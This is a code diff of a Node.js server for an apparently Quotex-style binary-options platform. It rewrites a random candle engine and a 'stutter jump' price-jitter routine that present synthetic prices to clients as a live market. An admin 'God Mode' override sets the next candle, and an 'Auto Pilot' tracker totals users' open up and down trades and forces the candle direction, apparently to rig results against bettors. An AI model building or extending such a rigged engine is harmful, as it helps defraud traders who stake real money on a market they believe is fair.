@@ -1,4 +1,4 @@
-// --- START: main app server.js (v40.0 - Quotex Jitter & Organic Reversals) ---
+// --- START: main app server.js (v41.0 - Pure Random & Quotex Jitter Engine) ---
 
 const express = require('express');
 const http = require('http');
@@ -34,7 +34,7 @@ const wss = new WebSocket.Server({ server });
 
 // --- SYSTEM CONSTANTS ---
 const TIMEFRAME = 60000;
-const TICK_MS = 300;
+const TICK_MS = 150; // Faster tick rate for more chaotic jumps
 const MIN_PRICE = 0.00001;
 const HISTORY_SEED_COUNT = 100;
 const MAX_CANDLES = 5000;
@@ -69,81 +69,40 @@ db.ref('admin/markets').on('value', (snapshot) => {
     });
 });
 
-// 🔥 THE NEW 100% REALISTIC MARKET ENGINE 🔥
+// 🔥 THE NEW PURE RANDOM MARKET ENGINE 🔥
+// This generates target boundaries, but allows infinite natural variation
 function generateRealisticCandle(marketData, timestamp, open, forcedDirection = null, isLive = false) {
     const safeOpen = Math.max(MIN_PRICE, open);
 
-    // 1. Mean Reversion for Trend (Prevents market from going in one direction forever)
-    marketData.trendBias *= 0.80; // Pull back to center
-    marketData.trendBias += (Math.random() - 0.5) * 0.40; 
-    marketData.trendBias = Math.max(-0.7, Math.min(0.7, marketData.trendBias));
+    // Natural Market Breathing (Volatility expansion and contraction)
+    marketData.volatility = (marketData.volatility * 0.9) + ((Math.random() - 0.5) * 0.2);
+    marketData.volatility = Math.max(0.4, Math.min(2.0, marketData.volatility));
 
-    marketData.volatility += (Math.random() - 0.5) * 0.20;
-    marketData.volatility = Math.max(0.5, Math.min(2.5, marketData.volatility));
+    // Base movement scale based on current price
+    const baseScale = safeOpen * 0.00006 * marketData.volatility;
 
-    // 2. Determine Direction
-    let isGreen;
-    if (forcedDirection === 'GREEN') isGreen = true;
-    else if (forcedDirection === 'RED') isGreen = false;
-    else {
-        isGreen = Math.random() < (0.5 + marketData.trendBias);
-    }
+    // Pure Random Walk Generation for Body
+    // Using exponential distribution to make mostly normal candles, but occasional massive breakouts
+    let rawBodyMovement = (Math.random() - 0.5) * 2.0; 
+    
+    // Apply forced direction (from Auto-Pilot tracking)
+    if (forcedDirection === 'GREEN') rawBodyMovement = Math.abs(rawBodyMovement) + 0.1;
+    else if (forcedDirection === 'RED') rawBodyMovement = -Math.abs(rawBodyMovement) - 0.1;
 
-    // Anti-Streak Logic (Force reversal if too many same colored candles in a row)
-    marketData.consecGreen = marketData.consecGreen || 0;
-    marketData.consecRed = marketData.consecRed || 0;
+    // The actual difference between open and close
+    const bodyDiff = baseScale * rawBodyMovement * (1 + Math.random() * 2);
+    const close = safeOpen + bodyDiff;
 
-    if (!forcedDirection) {
-        if (marketData.consecGreen >= 3 && Math.random() > 0.2) {
-            isGreen = false; // Force Red after 3-4 Greens
-            marketData.trendBias = -0.5;
-        } else if (marketData.consecRed >= 3 && Math.random() > 0.2) {
-            isGreen = true; // Force Green after 3-4 Reds
-            marketData.trendBias = 0.5;
-        }
-    }
+    // Randomize Wicks Independently (No forced shapes)
+    // Sometimes no wick (0), sometimes massive wick
+    const maxBody = Math.max(safeOpen, close);
+    const minBody = Math.min(safeOpen, close);
 
-    // Update Streak Counters
-    if (isGreen) { marketData.consecGreen++; marketData.consecRed = 0; } 
-    else { marketData.consecRed++; marketData.consecGreen = 0; }
+    const upWickDiff = baseScale * -Math.log(Math.random()) * 0.5; // Exponential random
+    const dnWickDiff = baseScale * -Math.log(Math.random()) * 0.5;
 
-    // 3. Determine Volatility/Size
-    const baseVol = safeOpen * 0.00004 * marketData.volatility;
-
-    // 4. Determine Candle Pattern
-    const typeRoll = Math.random();
-    let body, upWick, dnWick;
-
-    if (typeRoll < 0.15) {
-        // Doji
-        body = baseVol * (Math.random() * 0.1);
-        upWick = baseVol * (0.8 + Math.random() * 1.5);
-        dnWick = baseVol * (0.8 + Math.random() * 1.5);
-    } 
-    else if (typeRoll < 0.35) {
-        // Pin Bar / Hammer
-        body = baseVol * (0.2 + Math.random() * 0.5);
-        const longWick = baseVol * (1.5 + Math.random() * 2.5);
-        const shortWick = baseVol * (Math.random() * 0.3);
-        if (Math.random() > 0.5) { upWick = longWick; dnWick = shortWick; } 
-        else { upWick = shortWick; dnWick = longWick; }
-    } 
-    else if (typeRoll < 0.50) {
-        // Marubozu
-        body = baseVol * (1.5 + Math.random() * 1.5);
-        upWick = baseVol * (Math.random() * 0.1);
-        dnWick = baseVol * (Math.random() * 0.1);
-    } 
-    else {
-        // Normal
-        body = baseVol * (0.5 + Math.random() * 1.0);
-        upWick = baseVol * (0.2 + Math.random() * 0.8);
-        dnWick = baseVol * (0.2 + Math.random() * 0.8);
-    }
-
-    const close = isGreen ? safeOpen + body : safeOpen - body;
-    const high = Math.max(safeOpen, close) + upWick;
-    const low = Math.min(safeOpen, close) - dnWick;
+    const high = maxBody + upWickDiff;
+    const low = minBody - dnWickDiff;
 
     if (!isLive) return { timestamp, open: roundPrice(safeOpen), high: roundPrice(high), low: roundPrice(low), close: roundPrice(close) };
 
@@ -153,6 +112,7 @@ function generateRealisticCandle(marketData, timestamp, open, forcedDirection = 
     };
 }
 
+// 👑 ADMIN COMMAND ENGINE (God Mode - Completely Separate)
 function generateAdminCandle(timestamp, open, command, cloneData) {
     if (command === 'CUSTOM_CLONE' && cloneData) {
         const bodySize = cloneData.body || 0;
@@ -173,7 +133,7 @@ function generateAdminCandle(timestamp, open, command, cloneData) {
     const baseVol = open * 0.00006;
     let body, upWick, dnWick;
 
-    if (isDoji) { body = baseVol * 0.05; upWick = baseVol * 1.5; dnWick = baseVol * 1.5; } 
+    if (isDoji) { body = baseVol * 0.02; upWick = baseVol * 1.5; dnWick = baseVol * 1.5; } 
     else if (command.includes('MARUBOZU')) { body = baseVol * 2.5; upWick = 0; dnWick = 0; } 
     else if (command.includes('HAMMER')) { body = baseVol * 0.5; upWick = 0.1; dnWick = baseVol * 2.0; } 
     else if (command.includes('SHOOTING_STAR')) { body = baseVol * 0.5; upWick = baseVol * 2.0; dnWick = 0.1; } 
@@ -202,7 +162,7 @@ async function initializeNewMarket(marketId) {
     const candles = [];
     let currentPrice = startPrice;
     
-    markets[marketId] = { marketId, marketPath: path, trendBias: 0, volatility: 1.0, consecGreen: 0, consecRed: 0, history: [], currentPrice: startPrice };
+    markets[marketId] = { marketId, marketPath: path, volatility: 1.0, history: [], currentPrice: startPrice };
 
     for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
         const c = generateRealisticCandle(markets[marketId], nowPeriod - (i * TIMEFRAME), currentPrice, null, false);
@@ -221,12 +181,14 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
     if (currentPeriod > lastCandle.timestamp) {
         let newCandle;
 
+        // Admin Override Check
         if (marketData.nextCandleCommand) {
             newCandle = generateAdminCandle(currentPeriod, lastCandle.close, marketData.nextCandleCommand, marketData.nextCandleCloneData);
             marketData.nextCandleCommand = null;
             marketData.nextCandleCloneData = null;
         }
 
+        // Auto Pilot Tracker
         if (!newCandle && SMART_AUTO_PILOT) {
             const trades = activeTradesDb[marketData.marketId] || {};
             let totalUp = 0, totalDown = 0;
@@ -313,7 +275,7 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
     return lastCandle;
 }
 
-// Quotex-Style Micro Swings (STUTTER JUMP LOGIC)
+// ⚡ QUOTEX-STYLE JITTER ENGINE (আটকে আটকে লাফাবে) ⚡
 function updateRealisticPrice(marketData, candle, currentPeriod) {
     if (!candle.isPredetermined) return;
 
@@ -321,63 +283,56 @@ function updateRealisticPrice(marketData, candle, currentPeriod) {
     const timeElapsed = Math.max(0, now - currentPeriod);
     const progress = Math.min(timeElapsed / TIMEFRAME, 1.0);
 
-    if (!candle.waypoints) {
-        candle.waypoints = [];
-        const numWaypoints = 10; // Less waypoints means sharper, chunkier jumps
-        for (let i = 0; i < numWaypoints; i++) {
-            if (i === 0) candle.waypoints.push(candle.open);
-            else if (i === numWaypoints - 1) candle.waypoints.push(candle.targetClose);
-            else {
-                let wp = candle.open + (candle.targetClose - candle.open) * (i / numWaypoints);
-                wp += (Math.random() - 0.5) * Math.abs(candle.targetHigh - candle.targetLow) * 0.8;
-                candle.waypoints.push(wp);
-            }
+    // Initialize Jitter Memory for this specific candle
+    if (!candle.nextJumpTime) {
+        candle.nextJumpTime = now;
+        marketData.currentPrice = candle.open;
+        candle.liveHigh = candle.open;
+        candle.liveLow = candle.open;
+        candle.jumpFactor = (candle.open * 0.00008) * (0.5 + Math.random());
+    }
+
+    // Only move price when the internal "Jump Timer" is reached (Creates the stutter effect)
+    if (now >= candle.nextJumpTime) {
+        // Base linear progress towards the target close
+        const baseline = candle.open + (candle.targetClose - candle.open) * progress;
+        
+        // Huge chaotic jumps that randomly shoot towards targets
+        let chaoticJump = (Math.random() - 0.5) * 2 * candle.jumpFactor;
+        
+        let newPrice = baseline + chaoticJump;
+
+        // Occasional extreme spikes to naturally build the target Wicks
+        if (Math.random() < 0.15) {
+            newPrice += (candle.targetHigh - newPrice) * Math.random();
+        } else if (Math.random() < 0.15) {
+            newPrice -= (newPrice - candle.targetLow) * Math.random();
         }
+
+        marketData.currentPrice = newPrice;
         
-        candle.highIdx = 2 + Math.floor(Math.random() * 4);
-        candle.lowIdx = 2 + Math.floor(Math.random() * 4);
-        if(candle.highIdx === candle.lowIdx) candle.lowIdx = (candle.highIdx + 2) % (numWaypoints-2);
-        
-        candle.waypoints[candle.highIdx] = candle.targetHigh;
-        candle.waypoints[candle.lowIdx] = candle.targetLow;
+        // Randomize the next freeze time (200ms to 900ms delay) -> This causes the "stuck then jump" feel
+        candle.nextJumpTime = now + (200 + Math.random() * 700);
     }
 
-    const numWaypoints = candle.waypoints.length;
-    const currentWaypointIndex = Math.min(Math.floor(progress * (numWaypoints - 1)), numWaypoints - 2);
-    const waypointProgress = (progress * (numWaypoints - 1)) - currentWaypointIndex;
-
-    const startWp = candle.waypoints[currentWaypointIndex];
-    const endWp = candle.waypoints[currentWaypointIndex + 1];
-
-    let idealPrice = startWp + (endWp - startWp) * waypointProgress;
-
-    // 🔥 TICK STUTTERING LOGIC (Quotex style "Atke Atke" cholbe)
-    const baseVolatility = candle.open * 0.00008; // Higher visual jitter
-    
-    // Hold price for random milliseconds (stutter effect)
-    if (!marketData.lastTickTime || now - marketData.lastTickTime > (300 + Math.random() * 600)) {
-        marketData.lastTickTime = now;
-        // Big sudden jump
-        marketData.currentJitter = (Math.random() - 0.5) * baseVolatility;
-    }
-
-    marketData.currentPrice = idealPrice + marketData.currentJitter;
-
-    if (candle.isAdminCommand) {
-        if (currentWaypointIndex === candle.highIdx - 1 && waypointProgress > 0.8) marketData.currentPrice = candle.targetHigh;
-        if (currentWaypointIndex === candle.lowIdx - 1 && waypointProgress > 0.8) marketData.currentPrice = candle.targetLow;
-    }
-
-    if (timeElapsed >= TIMEFRAME - 200) {
+    // Lock to final close in the last 2 seconds
+    if (timeElapsed >= TIMEFRAME - 2000) {
         marketData.currentPrice = candle.targetClose;
-    } else {
-        marketData.currentPrice = Math.min(marketData.currentPrice, candle.targetHigh);
-        marketData.currentPrice = Math.max(marketData.currentPrice, candle.targetLow);
     }
 
+    // Hard boundary constraints (Admin/AutoPilot Safety)
+    marketData.currentPrice = Math.min(marketData.currentPrice, candle.targetHigh);
+    marketData.currentPrice = Math.max(marketData.currentPrice, candle.targetLow);
+
+    // Update live candle visually
     candle.close = roundPrice(marketData.currentPrice);
-    candle.high = roundPrice(Math.max(candle.high, candle.close, candle.open));
-    candle.low = roundPrice(Math.min(candle.low, candle.close, candle.open));
+    
+    // Organically stretch the wicks on the client's screen
+    candle.liveHigh = Math.max(candle.liveHigh, candle.close);
+    candle.liveLow = Math.min(candle.liveLow, candle.close);
+
+    candle.high = roundPrice(candle.liveHigh);
+    candle.low = roundPrice(candle.liveLow);
 }
 
 function broadcastCandle(marketId, candle) {
@@ -802,7 +757,7 @@ db.ref('users').on('child_changed', (snap) => {
 });
 
 app.get('/ping', async (_req, res) => {
-    res.send('Server V40.0 - Jitter & Organic Market Engine Active');
+    res.send('Server V41.0 - Pure Random & Quotex Jitter Engine Active');
     const timeStr = new Date().toLocaleTimeString('en-US', { timeZone: 'Asia/Dhaka' });
     await sendPingBotAlert(`⚙️ <b>Pulse Ping Received:</b>\nTime: <code>${timeStr}</code> (Dhaka)\nStatus: <code>Render Active</code>`);
 });
